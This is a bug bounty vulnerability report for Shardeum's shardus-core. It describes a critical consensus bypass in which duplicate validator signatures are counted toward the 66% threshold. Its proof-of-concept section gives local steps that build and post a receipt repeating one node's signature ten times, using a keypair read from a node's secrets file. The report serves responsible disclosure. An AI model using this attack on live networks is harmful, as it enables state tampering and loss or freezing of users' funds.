# #35694 \[BC-Critical] Consensus can be bypassed by single validator node from transaction execution g

**Submitted on Oct 3rd 2024 at 17:04:50 UTC by @Merkle\_Bonsai for** [**Audit Comp | Shardeum: Core II**](https://immunefi.com/audit-competition/shardeum-core-ii-boost)

* **Report ID:** #35694
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardus-core/tree/dev>
* **Impacts:**
  * Consensus bypass
  * Causing network processing nodes to process transactions from the transaction queue beyond set parameters
  * Direct loss of funds
  * Permanent freezing of funds (fix requires hardfork)

## Description

## Brief/Intro

Shardus \`TransactionConsensus.verifyAppliedReceipt\`, responsible for verification of 66%+ consensus across transaction execution group, is not checking for uniqueness of execution group signatures, only about its count, allowing malicious validator to mark transaction as verified by execution group solely. Since execution group is required, not every transaction can be handled like this, yet, due to execution groups rotation, attacker is able to find good timing for any transaction to be in its execution group.

## Vulnerability Details

\`TransactionConsensus.verifyAppliedReceipt\` is using following logic: \`\`\` let validSignatures = 0; const appliedVoteHash: AppliedVoteHash = { txid: receipt.proposal.txid, voteHash: receipt.proposalHash, voteTime: 0 }

```
for (let i &#x3D; 0; i &lt; receipt.signaturePack.length; i++) {
  const sign &#x3D; receipt.signaturePack[i]
  if (!executionGroupNodes.has(sign.owner)) continue
  appliedVoteHash.voteTime &#x3D; receipt.voteOffsets[i]
  const signedObject &#x3D; { ...appliedVoteHash, sign };
  if (this.crypto.verify(signedObject, sign.owner)) {
    validSignatures++;
  }
}
```

\`\`\`

This check is used in \`poqo-receipt-gossip\`, \`binary/poqo\_data\_and\_receipt\`, \`binary/poqo\_send\_receipt\` that are fundamental communication primitives of consensus logic, relying on multiple validators guarantees. However, if same signature and voteOffset for 100 times are passed in this function, \`validSignatures\` will take every into account.

Moreover, \`poqo-receipt-gossip\` is requesting final data from random node of \`payload.signaturePack\[].owner\` list. In this case, attacker will know that his node will be asked for this request (since he is only one in signature pack), allowing him to return any state for address datas requested, freely modifying chain state.

## Impact Details

This attack vector allows any validator to basically perform any changes to the network and modify any states.

## Recommendations

Add uniqueness check to \`verifyAppliedReceipt\`

## Proof of Concept

## Proof of Concept

It is quite hard to build full end-to-end example of this attack, as it will require full-scale malicious node codebase, making things unreadable. As a minimalistic example, following can be done:

1. In \`shardeum/index.ts\`, add following handler to expose some internals: \`\`\` import \* as p2pNodeList from '@shardus/core/dist/p2p/NodeList' ... shardus.registerExternalPost('binary\_poqo', async (req, res) => { await tellBinary\<PoqoSendReceiptReq>( p2pNodeList.byIdOrder, InternalRouteEnum.binary\_poqo\_send\_receipt, { ...req.body.signedReceipt, txGroupCycle: req.body.txGroupCycle }, serializePoqoSendReceiptReq, { tracker\_id: '', }, true, '' ) res.send() }) \`\`\`
2. connect to any node with debugger. This can be done by sending SIGUSR1, allowing to interactively debug what's happening. Set breakpoint in \`TransactionConsensus.ts\` on line 1186, around here: \`\`\` const poqoSendReceiptBinary: Route\<InternalBinaryHandler\<Buffer>> = { name: InternalRouteEnum.binary\_poqo\_send\_receipt, handler: async (payload, respond, header) => { const route = InternalRouteEnum.binary\_poqo\_send\_receipt this.profiler.scopedProfileSectionStart(route) nestedCountersInstance.countEvent('internal', route) \`\`\`
3. send any transaction, irrelevant if it's bad or good. I was using this call \`\`\` await shardus.p2p.sendGossipIn('spread\_tx\_to\_group', payload, '', null, p2pNodeList.byIdOrder, true, -1, payload.txId) \`\`\` to avoid tx being processed too fast.
4. do following call: \`\`\` const keypair = JSON.parse(await fs.readFile('../instances/shardus-instance-9005/secrets.json')) // e.g. node 9005 const txId = %tx id% const proposalHash = %any nonsense% const txGroupCycle = %correct group cycle% const voteHash = crypto.signObj( { txid: txId, voteHash: proposalHash, voteTime: 0, }, keypair.secretKey, keypair.publicKey ) await post('<http://127.0.0.1:9006/binary\\_poqo>', { signedReceipt: crypto.signObj( { proposal: { applied: true, cant\_preApply: false, accountIDs: \[], beforeStateHashes: \[], afterStateHashes: \[], appReceiptDataHash: '', txid: txId, }, proposalHash, voteOffsets: \[ voteHash.voteTime, voteHash.voteTime, voteHash.voteTime, voteHash.voteTime, voteHash.voteTime, voteHash.voteTime, voteHash.voteTime, voteHash.voteTime, voteHash.voteTime, voteHash.voteTime, ], signaturePack: \[ voteHash.sign, voteHash.sign, voteHash.sign, voteHash.sign, voteHash.sign, voteHash.sign, voteHash.sign, voteHash.sign, voteHash.sign, voteHash.sign, ], }, keypair.secretKey, keypair.publicKey ), txGroupCycle, }) \`\`\`
5. Observe in debugger that transaction receipt is processed correctly despite same signature is reused.
